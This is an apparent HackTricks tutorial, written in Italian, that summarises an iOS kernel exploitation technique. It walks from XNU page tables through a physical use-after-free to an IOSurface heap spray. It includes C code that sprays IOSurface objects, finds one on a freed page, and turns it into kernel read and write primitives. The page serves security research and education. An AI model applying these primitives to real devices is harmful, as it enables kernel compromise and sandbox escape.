# iOS Physical Use After Free via IOSurface

{{#include ../../banners/hacktricks-training.md}}


## Physical use-after-free

Questo è un riassunto del post [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html); inoltre ulteriori informazioni su exploit che usano questa tecnica si trovano in [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd)

### Memory management in XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

Lo spazio di indirizzamento della virtual memory per i processi utente su iOS va da **0x0 a 0x8000000000**. Tuttavia, questi indirizzi non mappano direttamente sulla memoria fisica. Invece, il kernel usa i page tables per tradurre gli virtual addresses in effettivi physical addresses.

#### Levels of Page Tables in iOS

I page tables sono organizzati gerarchicamente in tre livelli:

1. **L1 Page Table (Level 1)**:
* Ogni entry qui rappresenta un ampio intervallo di virtual memory.
* Copre **0x1000000000 bytes** (o **256 GB**) di virtual memory.
2. **L2 Page Table (Level 2)**:
* Un’entry qui rappresenta una regione più piccola di virtual memory, specificamente **0x2000000 bytes** (32 MB).
* Un entry L1 può puntare a una tabella L2 se non può mappare l’intera regione da sola.
3. **L3 Page Table (Level 3)**:
* Questo è il livello più fine, dove ogni entry mappa una singola pagina di memoria da **4 KB**.
* Un entry L2 può puntare a una tabella L3 se è necessario un controllo più granulare.

#### Mapping Virtual to Physical Memory

* **Direct Mapping (Block Mapping)**:
* Alcune entry in un page table mappano direttamente un intervallo di virtual addresses a un intervallo contiguo di physical addresses (come una scorciatoia).
* **Pointer to Child Page Table**:
* Se serve un controllo più fine, un entry in un livello (es. L1) può puntare a un child page table al livello successivo (es. L2).

#### Example: Mapping a Virtual Address

Supponiamo di accedere all’indirizzo virtuale **0x1000000000**:

1. **L1 Table**:
* Il kernel controlla l’entry della L1 page table corrispondente a questo virtual address. Se contiene un pointer a una L2 page table, passa a quella L2.
2. **L2 Table**:
* Il kernel controlla la L2 page table per una mappatura più dettagliata. Se questa entry punta a una L3 page table, procede lì.
3. **L3 Table**:
* Il kernel consulta l’entry finale L3, che punta al physical address della pagina di memoria effettiva.

#### Example of Address Mapping

Se scrivi il physical address **0x800004000** nel primo indice della L2 table, allora:

* Gli virtual addresses da **0x1000000000** a **0x1002000000** sono mappati ai physical addresses da **0x800004000** a **0x802004000**.
* Questa è una block mapping al livello L2.

In alternativa, se l’entry L2 punta a una L3 table:

* Ogni pagina da 4 KB nell’intervallo virtuale **0x1000000000 -> 0x1002000000** sarebbe mappata da entry individuali nella L3 table.

### Physical use-after-free

Un **physical use-after-free** (UAF) avviene quando:

1. Un processo **alloca** della memoria come **readable e writable**.
2. I page tables vengono aggiornati per mappare questa memoria a un specifico physical address che il processo può accedere.
3. Il processo **dealloca** (free) la memoria.
4. Tuttavia, a causa di un **bug**, il kernel **dimentica di rimuovere la mapping** dai page tables, anche se marca la corrispondente memoria fisica come libera.
5. Il kernel può quindi **riallocare questa memoria fisica "liberata"** per altri scopi, come dati del kernel.
6. Poiché la mapping non è stata rimossa, il processo può ancora **leggere e scrivere** su quella memoria fisica.

Questo significa che il processo può accedere a **pagine di kernel memory**, che potrebbero contenere dati sensibili o strutture, permettendo potenzialmente a un attaccante di **manipolare la kernel memory**.

### IOSurface Heap Spray

Poiché l’attaccante non può controllare quali specifiche kernel pages verranno allocate sulla memoria liberata, usa una tecnica chiamata **heap spray**:

1. L’attaccante **crea un gran numero di IOSurface objects** nella kernel memory.
2. Ogni IOSurface object contiene un **valore magico** in uno dei suoi campi, rendendolo facile da identificare.
3. Scansionano le pagine liberate per vedere se uno di questi IOSurface objects è stato allocato su una pagina liberata.
4. Quando trovano un IOSurface object su una pagina liberata, possono usarlo per **leggere e scrivere kernel memory**.

Ulteriori informazioni su questo in [https://github.com/felix-pb/kfd/tree/main/writeups](https://github.com/felix-pb/kfd/tree/main/writeups)

> [!TIP]
> Tieni presente che i dispositivi iOS 16+ (A12+) introducono mitigazioni hardware (come PPL o SPTM) che rendono le tecniche di physical UAF molto meno praticabili.
> PPL impone protezioni MMU rigide sulle pagine relative al code signing, alle entitlements e ai dati sensibili del kernel, quindi, anche se una pagina viene riutilizzata, le scritture da userland o da codice kernel compromesso verso pagine protette da PPL vengono bloccate.
> Secure Page Table Monitor (SPTM) estende PPL rafforzando gli aggiornamenti dei page tables stessi. Assicura che anche codice kernel privilegiato non possa rimappare silenziosamente pagine liberate o manomettere le mappings senza passare per controlli sicuri.
> KTRR (Kernel Text Read-Only Region) blocca la sezione di codice del kernel come read-only dopo il boot. Questo impedisce qualsiasi modifica a runtime al codice del kernel, chiudendo una grande superficie d’attacco su cui gli exploit physical UAF spesso fanno affidamento.
> Inoltre, le allocazioni IOSurface sono meno prevedibili e più difficili da mappare in regioni accessibili da userland, il che rende il trucco della scansione per il valore magico molto meno affidabile. E IOSurface ora è protetto da entitlements e restrizioni di sandbox.

### Step-by-Step Heap Spray Process

1. **Spray IOSurface Objects**: L’attaccante crea molti IOSurface objects con un identificatore speciale ("magic value").
2. **Scan Freed Pages**: Controllano se uno qualsiasi degli oggetti è stato allocato su una pagina liberata.
3. **Read/Write Kernel Memory**: Manipolando i campi dell’IOSurface object, ottengono la capacità di eseguire **arbitrary reads and writes** nella kernel memory. Questo permette di:
* Usare un campo per **leggere qualsiasi valore a 32-bit** nella kernel memory.
* Usare un altro campo per **scrivere valori a 64-bit**, ottenendo un stabile **kernel read/write primitive**.

Genera oggetti IOSurface con il valore magico IOSURFACE\_MAGIC per cercarli in seguito:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
Cerca oggetti **`IOSurface`** in una pagina fisica liberata:
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### Ottenere lettura/scrittura del kernel con IOSurface

Dopo aver ottenuto il controllo di un oggetto IOSurface nella memoria del kernel (mappato su una pagina fisica liberata accessibile da userspace), possiamo usarlo per **operazioni arbitrarie di lettura e scrittura sul kernel**.

**Key Fields in IOSurface**

L'oggetto IOSurface ha due campi cruciali:

1. **Use Count Pointer**: Consente una **lettura 32-bit**.
2. **Indexed Timestamp Pointer**: Consente una **scrittura 64-bit**.

Sovrascrivendo questi puntatori, li reindirizziamo verso indirizzi arbitrari nella memoria del kernel, abilitando capacità di lettura/scrittura.

#### Lettura 32-bit del kernel

Per eseguire una lettura:

1. Sovrascrivere il **use count pointer** per puntare all'indirizzo target meno un offset di 0x14 byte.
2. Usare il metodo `get_use_count` per leggere il valore a quell'indirizzo.
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### Scrittura del kernel a 64 bit

Per effettuare una scrittura:

1. Sovrascrivere il **indexed timestamp pointer** con l'indirizzo di destinazione.
2. Usare il metodo `set_indexed_timestamp` per scrivere un valore a 64 bit.
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### Riepilogo del flusso dell'exploit

1. **Trigger Physical Use-After-Free**: Le pagine liberate sono disponibili per il riutilizzo.
2. **Spray IOSurface Objects**: Allocare molti oggetti IOSurface con un unico "magic value" nella memoria kernel.
3. **Identify Accessible IOSurface**: Individua un IOSurface su una pagina liberata che controlli.
4. **Abuse Use-After-Free**: Modifica i puntatori nell'oggetto IOSurface per abilitare **kernel read/write** arbitrari tramite i metodi di IOSurface.

Con queste primitive, l'exploit fornisce **32-bit reads** controllate e **64-bit writes** alla memoria kernel. Passi successivi del jailbreak potrebbero richiedere primitive di read/write più stabili, che potrebbero richiedere il bypass di protezioni aggiuntive (es. PPL su dispositivi arm64e più recenti).

{{#include ../../banners/hacktricks-training.md}}
